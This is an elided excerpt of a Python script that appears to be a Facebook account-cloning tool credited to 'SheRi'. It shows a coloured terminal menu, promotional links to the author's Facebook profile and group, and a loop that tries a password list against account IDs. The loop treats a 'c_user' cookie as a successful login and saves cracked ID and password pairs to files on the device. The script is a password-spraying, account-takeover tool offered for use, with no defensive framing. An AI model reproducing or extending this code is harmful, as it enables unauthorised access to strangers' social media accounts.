...
def ud():
    ...
    if opt == '1':
        ...
        os.system('xdg-open https://facebook.com/groups/431888145524246/')
...
def o():
    ...
    print('\x1b[1;32m [1] \x1b[1;37mRANDOM CLONING')

    print('\x1b[1;32m [2] \x1b[1;32mMY FB ACCOUNT')

    print(' \x1b[1;32m[3] \x1b[1;34mJOIN MY FB GROUP')

    print(' \x1b[1;32m[4] \x1b[1;31mCONTACT WHATSAPP')

    print(' \x1b[1;32m[5] \x1b[1;30mEXIT')
    ...
    if opt == '2':
    	...
    	os.system('xdg-open https://www.facebook.com/Shahnoor.780')    if opt == '3':
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSheRi

\033[1;32m     \033[1;32mFACEBOK      : \033[1;32m SheRi

\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m

\033[1;32m     \033[1;31mWHATSAPP     :  \033[1;31m

\033[1;32m     \033[1;98mTOOL         :  \033[1;98mFREE

\033[1;32m     \033[1;37mTOOL VIRSION :  \033[1;37m1.0

    \033[1;37m=========================================================

 

              \33[37;41m\t WELLCOME TO SheRi\33[0;m\n""")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(' \033[1;32m [SheRi-OK]  ' +cid+ ' | ' +ps+  '\033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/SheRi-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print(' \x1b[38;5;208m [SheRi-CP]  ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/SheRi-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r %s[SHANI-BRAND] [%s|%s]  [OK:%s]  [CP:%s] \r'%(P,loop,tl,len(oks),len(cps))),
